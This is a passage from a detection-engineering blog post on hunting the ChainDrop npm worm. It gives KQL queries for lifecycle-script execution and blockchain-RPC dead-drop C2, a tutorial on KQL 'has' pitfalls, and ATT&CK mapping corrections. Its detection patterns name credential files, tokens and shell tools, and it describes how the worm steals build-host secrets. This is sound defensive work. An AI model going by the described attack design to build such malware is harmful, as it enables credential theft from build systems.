The `endswith` **must** be dot-anchored and there **must** be an equality arm beside it. Drop the dot and `endswith "infura.io"` matches `evil-infura.io`. Drop the equality arm and a request to the apex domain itself is missed. Both halves are load-bearing.

And note where the result goes: into `RpcMatch`, a *set*, which becomes a label on the row — not into a `where`. The provider list has been demoted from the detection to an annotation, which is the argument of this whole act. **The list tells you what a destination is. The baseline tells you whether it's new. Only the second one is a detection.**

<br/>

### The C2 that defeats the C2 detection three days earlier

[Wednesday's Detection #3](https://devsecopsdadattack.com/2026-08-05-detection-engineering-brief-wednesday-august-5-2026/) defines suspicious C2 as an outbound connection **without DNS resolution** — `isempty(RemoteUrl)` or a `RemoteUrl` that's a bare IP literal, from a scripting interpreter, three or more times.

It's a reasonable heuristic and it is structurally blind to everything in this act. A ChainDrop beacon resolves `mainnet.infura.io` through your normal resolver, connects to a major CDN on 443, presents a valid certificate, and sends a well-formed JSON-RPC request that is indistinguishable from a price-feed query. `RemoteUrl` is populated. The destination is a household name. The connection is not direct-to-IP by any definition.

Two detections, three days apart, in the same brief series, and one of them defines C2 as *the absence of the thing the other one is entirely made of*. Neither is wrong. What's wrong is treating either as coverage of "C2", which is what a technique-level coverage map does when both get filed under T1071.001.

The honest statement is narrower and more useful: Wednesday covers C2 that **skipped name resolution**. This act covers C2 that **used a name you can't block**. Between them there's still a large middle — beaconing to a resolved, unremarkable, non-blockchain domain — that neither query touches and no query this week does.

<br/>

### Keeping it honest

Act II is the query in this article I trust least, and it's the one with a production rating in the brief:

- **You cannot see the JSON-RPC method.** `eth_call` lives in a TLS-encrypted POST body. `DeviceNetworkEvents` gives you a hostname, an IP, a port, and a process — it does not give you the distinction between *reading a C2 pointer out of contract storage* and *checking the price of ETH*. The best this query can say is "a build host talked to a blockchain API and hadn't before." That is a lead, not a verdict, and if you have TLS inspection on egress from build hosts, the method name in the request body is worth ten of everything above.
- **The baseline is the detection, and the baseline is fragile.** Ephemeral runners get a new `DeviceId` per job, which means **every destination is first-seen on every host, forever**, and the query degenerates into a list of every place your builds go. If your runners are ephemeral, change the baseline key from `DeviceId` to something durable — a device group, a runner-pool tag, an `OSPlatform + image` pair — and accept the coarser answer. Check first: `DeviceNetworkEvents | where Timestamp > ago(30d) | summarize Days = dcount(bin(Timestamp,1d)) by DeviceId | summarize Ephemeral = countif(Days <= 1), Durable = countif(Days > 1)`. If `Ephemeral` dominates, the query above is not going to work as written and no amount of tuning fixes it.
- **`materialize()` has a cache limit and 45 days of `DeviceNetworkEvents` is a lot of rows.** The `project` inside it is load-bearing, not tidiness. If it still spills, split the baseline into a pre-summarized `DeviceId, Dest` set computed on its own schedule and stored in a watchlist, and join to that instead. That is the shape I'd actually run in production.
- **A first-seen destination is not a first *ever* destination.** A 45-day baseline says nothing about day 46, and a worm patient enough to poll once a month beats it trivially. It also means a genuine web3 team looks anomalous for their first six weeks and then permanently normal — including if they're compromised in week seven.
- **`RemoteUrl` population varies more than anything else in this query.** On some sensor versions and platforms it carries a full URL, on others a bare hostname, and for a raw socket it's empty. The `DestKind` split exists so an empty value is visible as `IpOnly` rather than baselined into a single `""` bucket, but you should measure it before you rely on the name space at all: `DeviceNetworkEvents | where Timestamp > ago(7d) | summarize Total = count(), Named = countif(isnotempty(RemoteUrl)) by InitiatingProcessFileName | order by Total desc`. If `Named` is a small fraction for `node`, the entire domain-suffix half of this query is decorative in your estate and the IP-space baseline is doing all the work.
- **I originally built this act around a file, and the file doesn't exist any more.** The `@npmcli/run-script` README states plainly that npm *"writes a temporary script file containing the command as it exists in the `package.json`"* and deletes it afterward — which is a perfect `DeviceFileEvents` artifact, the exact same shape as last week's Spring `.hprof`, and I had a query built on it. Then I read the source. The temp file was introduced in `4.1.0` (June 2022) and **removed entirely in `4.2.1`** (August 2022); current npm passes the script inline as `['-c', '--', script]`. The README was never updated. Four years of stale documentation, and last week's article is literally about reading the source instead of the caveat. It cost me a section and it's the reason Act I can read the script body off the command line, so it wasn't wasted — but I'd have shipped it if I hadn't gone looking for the filename format.

<br/>

---

<br/>

## 🎖 Honorable Mention: Inventory the Thing You Can Close

![Honorable Mention](/assets/img/SinsOfTheGrandfather/Honorable.png)

Acts I and II detect a worm that has already executed on a host you may not have known was executing arbitrary code from strangers. Neither of them is finishable. There will always be another compromised package and another RPC provider.

Here is the finite population: **the build hosts where npm lifecycle scripts run at all.**

`npm ci --ignore-scripts` exists. So does `ignore-scripts=true` in `.npmrc`. On a CI runner installing from a committed lockfile, lifecycle scripts are, for most dependency trees, *unnecessary* — the packages that genuinely need them are a small, nameable set (native addons, mostly), and the standard fix is to allowlist those and disable the rest. Every organization that does this deletes ChainDrop's entire execution vector, along with the next one, and the one after that.

Almost nobody does it, and almost nobody knows whether they've done it, because it's a config setting in a file nobody reads on hosts nobody inventories. This query answers "where do lifecycle scripts execute, and for which packages" — and unlike everything above it, the answer is a **list you can finish**.

<br/>

### The KQL

```kql
let window = 30d;
let Bare = (s:string) {
    trim_end(@"\.(exe|cmd|bat|com|ps1)", tolower(extract(@"([^\\/]+)$", 1, tostring(s))))
};
let PkgRuntimes  = dynamic(["node","npm","npx","yarn","pnpm","bun","corepack"]);
let ScriptShells = dynamic(["sh","bash","dash","zsh","ash","busybox","cmd","powershell","pwsh"]);
// Same derived-prefilter discipline as Act I, same reason.
let AllTerms = array_concat(PkgRuntimes, ScriptShells);
DeviceProcessEvents
| where Timestamp > ago(window)
| where FileName has_any (AllTerms)
     or InitiatingProcessFileName has_any (AllTerms)
     or InitiatingProcessParentFileName has_any (AllTerms)
| extend Self   = Bare(FileName),
         Parent = Bare(InitiatingProcessFileName),
         Grand  = Bare(InitiatingProcessParentFileName)
| extend CmdLower  = tolower(tostring(ProcessCommandLine)),
         ParentCmd = tolower(tostring(InitiatingProcessCommandLine))
// An install INVOCATION: the runtime running a package manager in an install phase.
// \binstall\b deliberately does NOT match "postinstall" -- there is no word boundary
// between the t and the i, which is the behaviour we want here and would be a bug
// three lines down.
| extend IsInstallInvocation = Self in (PkgRuntimes)
        and (CmdLower contains "npm-cli.js" or CmdLower contains "yarn"
             or CmdLower contains "pnpm" or Self in ("npm","yarn","pnpm","bun"))
        and CmdLower matches regex @"\b(install|ci)\b"
// A lifecycle script EXECUTING: the mandatory shell layer, spawned by the runtime.
| extend IsLifecycleShell = Self in (ScriptShells) and Parent in (PkgRuntimes)
// The payload layer: whatever that shell then ran. Generation 2, same as Act I.
| extend IsLifecyclePayload = Parent in (ScriptShells) and Grand in (PkgRuntimes)
| where IsInstallInvocation or IsLifecycleShell or IsLifecyclePayload
// Which package's script. Scoped names carry a slash, hence the optional group.
| extend Pkg = extract(@"node_modules/((?:@[^/\s]+/)?[^/\s]+)/", 1,
                       strcat(ParentCmd, " ", CmdLower))
// Only observable when the flag is on the COMMAND LINE. ignore-scripts set in .npmrc or
// via NPM_CONFIG_IGNORE_SCRIPTS is invisible here -- see the caveat below.
| extend ExplicitIgnoreFlag = CmdLower contains "--ignore-scripts"
// Entity = the DEVICE, because the device is what you remediate.
| summarize
    Installs          = countif(IsInstallInvocation),
    InstallsWithFlag  = countif(IsInstallInvocation and ExplicitIgnoreFlag),
    LifecycleShells   = countif(IsLifecycleShell),
    LifecyclePayloads = countif(IsLifecyclePayload),
    Packages          = make_set_if(Pkg, isnotempty(Pkg), 100),
    PayloadImages     = make_set_if(Self, IsLifecyclePayload, 30),
    Accounts          = make_set(AccountName, 10),
    DeviceNames       = make_set(DeviceName, 5),
    ActiveDays        = dcount(bin(Timestamp, 1d)),
    FirstSeen         = min(Timestamp),
    LastSeen          = max(Timestamp)
    by DeviceId
| extend
    DistinctPackages = array_length(Packages),
    DistinctPayloads = array_length(PayloadImages),
    // real(null), not 0. A device with no installs has no coverage ratio -- it does not
    // have a ratio of zero, and a zero would sort it alongside the worst offenders.
    FlagCoverage     = iff(Installs > 0, round(100.0 * InstallsWithFlag / Installs, 1),
                           real(null))
// Posture, ranked. Note the third state: "probably disabled" is an INFERENCE from an
// absence, not a measurement, and it is labelled as one rather than reported as safety.
| extend Posture = case(
      Installs == 0 and LifecycleShells == 0,   "NoInstallActivity",
      LifecyclePayloads > 0,                    "ScriptsExecutingWithPayloads",
      LifecycleShells > 0,                      "ScriptsExecuting",
      Installs > 0,                             "ScriptsProbablyDisabled",
                                                "Unclear")
| order by LifecyclePayloads desc, DistinctPackages desc, LifecycleShells desc,
           Installs desc
```

<br/>

### The line that does the work

```kql
| extend IsLifecycleShell   = Self in (ScriptShells) and Parent in (PkgRuntimes)
| extend IsLifecyclePayload = Parent in (ScriptShells) and Grand in (PkgRuntimes)
```

Two booleans, and they are the difference between a hunt and an inventory.

`IsLifecycleShell` is a **measurement of configuration**. If a device runs `npm ci` fifty times a month and never once spawns a shell from `node`, lifecycle scripts are not executing there — either because `ignore-scripts` is set, or because nothing in the tree declares one. If it spawns shells, they are, and no amount of asking the platform team will tell you that as reliably as the process table does.

That's the same move as last week's exposure inventory, in a different domain. Acts I and II ask *did something bad happen*. This asks *what is our configuration*, and it answers with a device list, a package list, and a number you can drive down. The adversary is incidental to it — the exact same rows appear if the only thing ever installed was `lodash`.

`DistinctPackages` is the number I'd take to a platform team, because it converts "we should probably turn off lifecycle scripts" into "forty-one packages currently execute code on this runner during install; here are their names; nine of them are native addons and the other thirty-two don't need to." That's a conversation with an ending.

<br/>

### Keeping it honest

- **`ScriptsProbablyDisabled` is an inference from an absence and I've labelled it as one.** A device with installs and no lifecycle shells might have `ignore-scripts=true`. It might also have a dependency tree where nothing declares a script, or a lockfile that resolves entirely to cached prebuilt artifacts, or an agent that missed the events. The verdict says "probably" because that's what the data supports, and the alternative — reporting it as `Disabled` — is filing an unknown as safety, which is a mistake I made three times in one article last week.
- **`--ignore-scripts` on the command line is the *rare* way to set it.** Most estates that do this set it in a repo `.npmrc`, an org-level `.npmrc`, or `NPM_CONFIG_IGNORE_SCRIPTS` in the pipeline environment. None of those are visible in `DeviceProcessEvents`. `FlagCoverage` will read `0` in a well-configured environment, which is why it's ranked *below* `LifecycleShells` — the behavioural signal is the reliable one and the flag is a bonus.
- **Package attribution is best-effort.** `Pkg` comes from a `node_modules/` path appearing in a command line, and plenty of lifecycle scripts don't reference their own path — `"postinstall": "node-gyp rebuild"` mentions no package at all. Expect `DistinctPackages` to undercount, sometimes badly. It is a floor on your exposure, never a ceiling.
- **`npm` isn't the only package manager doing this.** `pip` runs `setup.py`, `gem` runs `extconf.rb`, `cargo` runs `build.rs`, `go generate` runs whatever you tell it. The shape of this query — runtime spawns shell spawns payload, with the runtime two generations up — transfers directly. The lists change and nothing else does.

<br/>

---

<br/>

## ✨ Bonus: The Term Index, or Why `has` Cannot Do What You Think

Five of this week's twenty-one queries contain a `has` or `has_any` that does not ask the question it was written to ask. Last week's article contained two. Mine contained one. It is, by a wide margin, the most common defect in circulating KQL, and it survives review because **it never errors and it usually returns rows**.

Here is the entire mechanism, and it fits in a paragraph.

<br/>

### Terms, not substrings

Kusto indexes string columns by breaking each value into **terms**: maximal runs of alphanumeric characters. Everything else — `.`, `/`, `-`, `_`, `\`, `:`, space — is a delimiter and is not part of any term. Terms of three characters or more go into an index; shorter ones don't, and a query for one falls back to a scan.

Every operator with `has` in its name tests **terms**. `contains` tests substrings.

```kql
"KustoExplorerQueryRun" has "Explorer"        // false
"KustoExplorerQueryRun" contains "Explorer"   // true
```

That's the whole thing. Every failure below is a consequence of it.

<br/>

### The five shapes, all from this week

**1. The delimiter that isn't a prefix marker.**

```kql
where ProcessCommandLine has_any (dynamic(["ACTIONS_"]))
```
`ACTIONS_` → the term `actions`. On a GitHub runner, where `/home/runner/work/_actions/` is in most command lines, this is close to `where true`. Written as a prefix, executes as a wildcard.

**2. The multi-token needle.**

```kql
where ProcessCommandLine has_any (dynamic(["GITHUB_TOKEN"]))
where RemoteUrl          has_any (dynamic(["infura.io"]))
where FolderPath         has_any (dynamic(["npm/token"]))
```
Two terms each, with a delimiter between them. `has` promises a *whole term* on the right-hand side; a delimiter-bearing RHS is outside the contract, and Microsoft's guidance is explicit that `contains` is the operator for it. Whatever your cluster does with these today is not something to build a detection on.

**3. The accidental success.**

```kql
where FileName in~ (".npmrc") or FolderPath has_any (".npmrc")
```
`.npmrc` → the single term `npmrc`. This one **works** — the leading dot is stripped by the tokenizer and the remainder is a clean term. It is the entry a reviewer spot-checks, concludes "the list is fine", and moves on. The list is not fine; this entry is.

**4. The dead clause hidden by an `or`.**

```kql
where FileName endswith ".hprof" or FileName has "heapdump"
```
Last week's, and worth repeating because it's the failure mode that outlives everyone who understood it. `heapdump2026-08-03-14-49123456.hprof` tokenizes to `heapdump2026`, not `heapdump`. The right half is permanently false; the left half carries the query; nothing looks wrong; and the day somebody drops the "redundant" extension check in favour of the "more specific" name check, the detection silently goes to zero.

**5. The over-broad negation, which is the dangerous one.**

```kql
where ProcessCommandLine !has "--version" and ProcessCommandLine !has " -v "
```
`version` and `v`. This drops every command line containing either as a standalone term.

The asymmetry is the point. A too-narrow `has` **returns nothing**, and nothing is visible — you notice an empty result set. A too-broad `!has` **deletes rows from a result set that still looks populated**. Every tokenizer mistake in a negation is a silent filter, and silent filters are how detections die without a ticket.

<br/>

### Picking the right operator

| You want | Use | Not |
|---|---|---|
| A whole word, delimiter-bounded | `has` / `has_any` | — |
| A word starting with X | `hasprefix` | `has "X_"` |
| A word ending with X | `hassuffix` | `has "_X"` |
| A substring, anywhere | `contains` | `has` |
| Any of N substrings | `mv-apply` + `contains` | `has_any` (there is no `contains_any`) |
| The whole value equals X | `==` / `=~` / `in` / `in~` | `has` |
| A domain, or anything under it | `H == D or H endswith "." + D` | `contains D` |
| A path segment | `split()` then `in` / `set_intersect` | `has` |
| Structure | parse it, then compare | any string operator |

The last two rows are last week's article compressed into a table, and the pattern behind all nine is one sentence: **if your data has structure, parse it and compare the parsed thing.** A URL has segments. A domain has labels. A path has components. A command line has arguments. Every time a detection reaches for a string operator against structured data, it is trading a precise question for a fuzzy one and hoping the fuzz falls in a safe direction.

<br/>

### The performance argument, honestly

`has` is faster than `contains`, and materially so: it hits the term index, while `contains` scans. That is a real reason to prefer it and a bad reason to use it where it doesn't fit.

The resolution is the prefilter pattern, which Act I uses:

```kql
// Cheap, indexed, deliberately BROAD -- and a strict superset of the test below.
| where InitiatingProcessFileName has_any (AncestryTerms)
// Precise, expensive, authoritative -- runs only on what survived.
| extend Parent = Bare(InitiatingProcessFileName)
| where Parent in (PkgRuntimes)
```

Two rules make this safe, and I've broken the first one in two consecutive articles:

1. **The prefilter must be a superset of the authoritative test**, or it narrows the detection silently. Derive it — `array_concat` — don't hand-maintain a parallel copy. A rule you have to remember to apply is a rule you will apply everywhere except the one place it mattered.
2. **The prefilter's needles must be single terms**, or you've reintroduced the whole problem in the fast path. `node`, `sh`, `curl` are fine. `infura.io` is not.

<br/>

---

<br/>

## The Bigger Lesson

![](/assets/img/SinsOfTheGrandfather/Bigger_Lesson.png)

Five briefs, twenty-one candidates, and a thread that runs through most of them: **every component of the attack was something you asked for.**

- **The execution was a documented feature.** npm lifecycle scripts are not a vulnerability. They exist so native addons can compile and git hooks can install, they run by default, and they run as whoever ran the install — which on a build host is the account holding the registry token, the CI token, and the cloud credentials. ChainDrop needed no exploit, no bypass, and no persistence mechanism. It needed to be *installed*, which you did, on a schedule, automatically.
- **The C2 was a public utility.** Not a bulletproof host, not a compromised WordPress site, not a domain you can sinkhole — a smart contract on a network with a million participants, read through a CDN-fronted API on 443 with a valid certificate. There is no takedown and no denylist that finishes. Last week's grammar was borrowed *permission*; the week before it was borrowed *infrastructure*. This week it's **borrowed trust**, and trust is worse than both because it's transitive. You audited a dependency. The dependency audited nothing.
- **The payload was two generations down, and every query in the week could see one.** This is the mechanical finding and it's the one I'd put on a wall. The shell layer between npm and the payload is inserted *by npm*, not by the attacker — it's in the documentation, it's unavoidable, and it moves every interesting process out of reach of the parent-child test that everyone writes by reflex. MDE hands you the second generation as a column. Nobody used it. **Learn the depth your tool records, then learn the depth your adversary operates at, and check that the first number is bigger.**
- **And again: you cannot detect a read.** [Friday's Detection 1](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) is titled "Secret Extraction via Environment Variable Access" and there is no telemetry anywhere in the Microsoft stack for a process reading its own environment. [Thursday's Detection 2](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) depends on `FileRead` events that `DeviceFileEvents` does not reliably emit. Last week it was the heapdump response and the Rails file read. Three weeks, four different reporting sources, same structural gap: **the operation modern credential theft is built on is the one nobody instruments.** You detect it by what happens next — a process, a connection, an authentication somewhere else — or you don't detect it.

The most useful thing in this week's data isn't in any of the three queries. It's the honorable mention's premise. Acts I and II are security operations: they find a compromise that already occurred, on infrastructure whose configuration made it inevitable. The inventory is just operations, it's boring, it produces a list of forty packages and a config flag, and it would have prevented more of this week than either detection would have caught. That was also last week's conclusion, and I'd rather it stopped being true.

**The corrections, collected.** Seven from the briefs:

1. **The PID self-join reconstructs a relationship that is already on the row** — and joining `child.InitiatingProcessId == npm.ProcessId` on `DeviceName + AccountName` treats a recycled PID as an identity. `InitiatingProcess*` is the parent; no join required.
2. **The `sh`/`bash` lane in that join is dead.** A child whose initiating process is `sh` has sh's PID in `InitiatingProcessId`, which is never npm's — so the lane can only match on a PID collision. It's dead for precisely the three-level chain that npm's own documented `sh -c` behaviour guarantees.
3. **`has_any(["GITHUB_TOKEN","ACTIONS_"])` asks a different question than it appears to.** `ACTIONS_` is the term `actions`, which is in most command lines on a GitHub runner; `GITHUB_TOKEN` is a multi-token needle. Neither is a prefix and neither is reliable.
4. **`!has "--version"` and `!has " -v "` exclude the terms `version` and `v`** — far broader than four narrow flags, in a negation, where over-breadth deletes findings silently.
5. **Port 8545/8546 cannot match a public RPC provider**, all of which serve TLS on 443. The brief's own tuning note says so, which makes the port clause an admitted-inert half of an `or`.
6. **`quicknode.pro` is the marketing domain; the RPC endpoints are `*.quiknode.pro`.** One character, and the entry can never match.
7. **ATT&CK: a credential-theft detection mapped to two C2 techniques**, and a supply-chain technique filed under the wrong tactic. Detail below.

**And five of mine.**

8. **My first fragment test was `has_any` on twenty delimiter-bearing needles** — the exact error I spend a section correcting, in the query that corrects it. The entry I spot-checked (`.npmrc`) was the one that happened to tokenize cleanly, so it passed.
9. **`coalesce()` over two `extract()` calls.** `extract()` returns an empty string on no match, not null, and `coalesce()` takes the first non-null — so a miss on the first argument would have beaten a hit on the second, every time. Same root as last week's zero-versus-null byte counter, different function, one article later.
10. **I built a `DeviceFileEvents` detection on a temp file npm stopped writing in 2022.** The `@npmcli/run-script` README still describes it. The source removed it in `4.2.1`. I read the documentation and not the code, which is the specific mistake last week's Act II exists to warn about.
11. **My prefilter drifted from my authoritative list. Again.** Third article running. It's `array_concat` in all three queries now, which is the only version of this that survives contact with a future edit.
12. **`take_any(iff(cond, x, ""))` is not `take_anyif(x, cond)`.** `take_any` picks an arbitrary row, and on a device where most rows are generation 1, the arbitrary row is usually the one where the `iff` returned an empty string — a sample column that is empty precisely when there's something to sample.

**Twelve corrections, five of them mine**, and the pattern is the same as the last two weeks with one variation worth naming. Corrections 8 and 9 are not new mistakes — they're *the same two mistakes from last week's article*, made again, in the queries written to demonstrate the fixes. I didn't forget the rules. I applied them where I was looking and not where I wasn't, which is what a rule does when it lives in your head instead of in the query. Number 11 is the only one that stayed fixed, and it stayed fixed because it became an `array_concat` — a mechanism, not a memory.

And one that isn't a bug: **the ATT&CK mappings for this cluster are wrong in a way that would inflate a coverage map.** [Friday's "GitHub Actions Runner Secret Extraction" — a credential-access detection](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) — is mapped to **T1071 Application Layer Protocol** and **T1090.001 Internal Proxy**, both Command and Control. An Ethereum RPC provider is many things; an internal proxy is not one of them. [Thursday's credential-store detection](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) maps `.npmrc` access to **T1078 Valid Accounts** under Persistence and files **T1195 Supply Chain Compromise** under **Impact** — but T1195 is an Initial Access technique and has no Impact variant. Three detections, three plausible mappings, and plausible is the problem: nothing downstream ever contradicts a mapping that looks reasonable, so a coverage map fed by this week reports C2 coverage it doesn't have and credential-access coverage it never claimed.

Every one of these came straight out of this week's daily briefs — each detection shipped with ATT&CK mappings, telemetry requirements, deployment gates, triage runbooks, false-positive notes, and an honest readiness call. Twenty-one this week, and once again the ones I disagreed with were the ones worth writing about.

This kind of detection content is published _daily_ — fresh threat intel translated straight into deployable detections, so you spend your time tuning and shipping instead of reading and re-deriving — that's the whole point of the **[Daily Detection Engineering Brief at DevSecOpsDadAttack.com](https://devsecopsdadattack.com/detectionengineering/)**.

<br/>

![Outro](/assets/img/SinsOfTheGrandfather/Outro.png)

<br/>

---

<br/>

## Helpful Links and References:

This Week's Detection Engineering Briefs:
- [Monday, 3rd August](https://devsecopsdadattack.com/2026-08-03-detection-engineering-brief-monday-august-3-2026/)
- [Tuesday, 4th August](https://devsecopsdadattack.com/2026-08-04-detection-engineering-brief-tuesday-august-4-2026/)
- [Wednesday, 5th August](https://devsecopsdadattack.com/2026-08-05-detection-engineering-brief-wednesday-august-5-2026/)
- [Thursday, 6th August](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/)
- [Friday, 7th August](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/)

DevSecOpsDadAttack Tags:
- [detection-engineering](https://devsecopsdadattack.com/tags/#detection-engineering)
- [kql](https://devsecopsdadattack.com/tags/#kql)
- [npm](https://devsecopsdadattack.com/tags/#npm)
- [ChainDrop](https://devsecopsdadattack.com/tags/#ChainDrop)
- [Supply Chain](https://devsecopsdadattack.com/tags/#Supply-Chain)
- [Lifecycle Scripts](https://devsecopsdadattack.com/tags/#Lifecycle-Scripts)
- [Build Hosts](https://devsecopsdadattack.com/tags/#Build-Hosts)
- [GitHub Actions](https://devsecopsdadattack.com/tags/#GitHub-Actions)
- [Ethereum](https://devsecopsdadattack.com/tags/#Ethereum)
- [Dead Drop Resolver](https://devsecopsdadattack.com/tags/#Dead-Drop-Resolver)
- [DeviceProcessEvents](https://devsecopsdadattack.com/tags/#DeviceProcessEvents)
- [DeviceNetworkEvents](https://devsecopsdadattack.com/tags/#DeviceNetworkEvents)
- [Process Ancestry](https://devsecopsdadattack.com/tags/#Process-Ancestry)
- [Term Index](https://devsecopsdadattack.com/tags/#Term-Index)
- [mv-apply](https://devsecopsdadattack.com/tags/#mv-apply)
- [Baselining](https://devsecopsdadattack.com/tags/#Baselining)
- [T1195](https://devsecopsdadattack.com/tags/#T1195)
- [T1195.002](https://devsecopsdadattack.com/tags/#T1195-002)
- [T1102.001](https://devsecopsdadattack.com/tags/#T1102-001)
- [T1552.001](https://devsecopsdadattack.com/tags/#T1552-001)
- [T1059.004](https://devsecopsdadattack.com/tags/#T1059-004)
- [Microsoft Sentinel](https://devsecopsdadattack.com/tags/#Microsoft-Sentinel)
- [Defender XDR](https://devsecopsdadattack.com/tags/#Defender-XDR)

ATT&CK Coverage in This Article:

**Detected by the queries above:**
- **T1195.002** — Compromise Software Supply Chain (Act I: a lifecycle script from an installed dependency executing a payload on a build host. This is the technique the whole cluster belongs to, and it's the one the briefs get right.)
- **T1059.004 / T1059.003** — Unix Shell / Windows Command Shell (Act I: the mandatory shell layer between the package manager and the payload. Note this is a *structural* mapping — the shell is spawned by npm, not by the adversary, so the technique describes the mechanism rather than an adversary choice.)
- **T1552.001** — Unsecured Credentials: Credentials In Files (Act I, the `SecretRuns` arm specifically: a lifecycle process whose command line references `.npmrc`, `.git-credentials`, `~/.aws/credentials`. Mapped only for that arm — the rest of the query tests execution, not credential access, and claiming otherwise would report coverage the predicate doesn't provide.)
- **T1102.001** — Web Service: Dead Drop Resolver (Act II. An Ethereum smart contract holding an encoded pointer to the real C2, read through a legitimate third-party web service, is the definition of the sub-technique — *"an existing, legitimate external Web service to host information that points to additional command and control infrastructure."* The blockchain adds immutability, not a new technique.)

**Present in the activity, not cleanly mappable:**
- **T1546.016** — Event Triggered Execution: Installer Packages is the closest thing ATT&CK has to "a package manager ran a script during install," and it isn't close enough. It sits under Persistence and Privilege Escalation and describes an adversary *establishing* a trigger. A `postinstall` script in a compromised dependency isn't a trigger the adversary installed on your host — it's a trigger your tooling honours by design. Mapping it would report persistence coverage for a behaviour with no persistence in it.

**Deliberately unmapped:**
- **The honorable mention carries no technique**, for the same reason as last week's exposure inventory. It doesn't detect an adversary; it measures a configuration, and the identical rows appear on a host that has never installed anything worse than `lodash`. A configuration finding is not adversary behaviour and does not belong on a coverage map — and if your map has nowhere to put "we execute arbitrary code from strangers on every build," that's a gap in the map.

**Discussed as a correction, not covered by any query here:**
- **T1071.001 / T1090.001 on a credential-access detection.** [Friday's Detection 1](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/) hunts secret extraction on a runner and is mapped entirely to Command and Control techniques. The behaviour is T1552 (what was taken) and T1195.002 (how they got there); an RPC provider is not an internal proxy under any reading of T1090.001.
- **T1195 filed under Impact.** [Thursday's Detection 2](https://devsecopsdadattack.com/2026-08-06-detection-engineering-brief-thursday-august-6-2026/) lists "Impact: T1195 Supply Chain Compromise". T1195 is an **Initial Access** technique with no Impact variant. Tactic errors are worse than technique errors in a coverage map, because they misreport which *phase* you can see.
- **T1071.001 on both [Wednesday's direct-to-IP C2](https://devsecopsdadattack.com/2026-08-05-detection-engineering-brief-wednesday-august-5-2026/) and [Friday's blockchain C2](https://devsecopsdadattack.com/2026-08-07-detection-engineering-brief-friday-august-7-2026/).** Two detections whose definitions of C2 are mutually exclusive — one requires the absence of name resolution, the other is entirely name-resolved — reporting into the same cell. Both mappings are defensible; the aggregate is not.

External Sources:
- Johannes B. Ullrich / SANS Internet Storm Center. *Don't Revoke That Token Yet: Inside the keyv/cacheable npm Worm.* 5 August 2026. <https://isc.sans.edu/diary/rss/33218>
- Unit 42, Palo Alto Networks. *ChainDrop: Inside a Self-Propagating npm Worm.* <https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/>
- Microsoft Security Blog. *ChainDrop supply chain compromise: Anatomy of a self-propagating worm.* 4 August 2026. <https://www.microsoft.com/en-us/security/blog/2026/08/04/chaindrop-supply-chain-compromise-anatomy-self-propagating-worm/>
- npm Docs. *scripts — how npm handles the "scripts" field.* <https://docs.npmjs.com/cli/v11/using-npm/scripts/>
- npm. *@npmcli/run-script.* <https://github.com/npm/run-script>
- npm/cli. *deps: @npmcli/run-script@4.2.1 — "remove the temp file entirely."* <https://github.com/npm/cli/commit/d0f5995e0399a093c8037057150a922e56b1d7ca>
- Microsoft Learn. *String operators — understanding string terms.* <https://learn.microsoft.com/en-us/kusto/query/datatypes-string-operators>
- Microsoft Learn. *DeviceProcessEvents table in the advanced hunting schema.* <https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table>
- MITRE ATT&CK. *Web Service: Dead Drop Resolver (T1102.001).* <https://attack.mitre.org/techniques/T1102/001/>
- MITRE ATT&CK. *Supply Chain Compromise: Compromise Software Supply Chain (T1195.002).* <https://attack.mitre.org/techniques/T1195/002/>
- QuickNode Docs. *Ethereum API Endpoints.* <https://www.quicknode.com/docs/ethereum/endpoints>
- Cloudflare. *Ethereum Gateway.* <https://developers.cloudflare.com/web3/ethereum-gateway/>

<br/>

---

<br/>

# Stay Ahead of Emerging Threats

_Looking for actionable threat intelligence and detection engineering insights?_

DevSecOpsDadAttack publishes daily:

📈 Threat Intelligence Briefs focused on active campaigns, exploitation trends, and operational risk <br/><br/>
🛠️ Detection Engineering Briefs with ATT&CK mappings, telemetry requirements, KQL detections, tuning guidance, and triage workflows <br/><br/>
🔍 Practical analysis designed for SOC teams, threat hunters, detection engineers, and security leaders <br/><br/>

Visit [DevSecOpsDadAttack.com](https://devsecopsdadattack.com) for the latest intelligence and detection content.

<br/>

<div style="text-align:center; margin: 2.5em 0;">
  <a href="https://devsecopsdadattack.com" target="_blank" rel="noopener noreferrer">
    <img 
      src="/assets/img/Attack1.png"
      style="width: auto; margin: 0 auto; box-shadow: 0 16px 40px rgba(0,0,0,.45); border-radius: 8px;"
    />
  </a>
</div>

<br/><br/>

# 📚 Want to go deeper?

Anyone can aggregate threat intel.
Very few teams can prove why they acted—or why they didn’t.

The below books are about closing that gap; turning curated signal into defensible decisions across KQL, PowerShell, and the Microsoft security stack.

<br/><br/>

<div style="text-align:center; margin: 2.5em 0;">
  <a href="https://a.co/d/hZ1TVpO" target="_blank" rel="noopener noreferrer">
    <img 
      src="/assets/img/KQL Toolbox Cover.jpg"
      alt="KQL Toolbox: Turning Logs into Decisions in Microsoft Sentinel"
      style="width: 215px; margin: 0 auto; box-shadow: 0 16px 40px rgba(0,0,0,.45); border-radius: 8px;"
    />
  </a>
  <p style="margin-top: 0.75em; font-size: 0.95em; opacity: 0.85;">
    🛠️ <strong>KQL Toolbox:</strong> Turning Logs into Decisions in Microsoft Sentinel
  </p>
</div>

<br/>

<div style="text-align:center; margin: 2.5em 0;">
  <a href="https://a.co/d/ifIo6eT" target="_blank" rel="noopener noreferrer">
    <img 
      src="/assets/img/PowerShell-Cover.jpg"
      alt="PowerShell Toolbox: Hands-On Automation for Auditing and Defense"
      style="width: 215px; margin: 0 auto; box-shadow: 0 16px 40px rgba(0,0,0,.45); border-radius: 8px;"
    />
  </a>
  <p style="margin-top: 0.75em; font-size: 0.95em; opacity: 0.85;">
    🧰 <strong>PowerShell Toolbox:</strong> Hands-On Automation for Auditing and Defense
  </p>
</div>

<br/>

<div style="text-align:center; margin: 2.5em 0;">
  <a href="https://a.co/d/4vveVCI" target="_blank" rel="noopener noreferrer">
    <img 
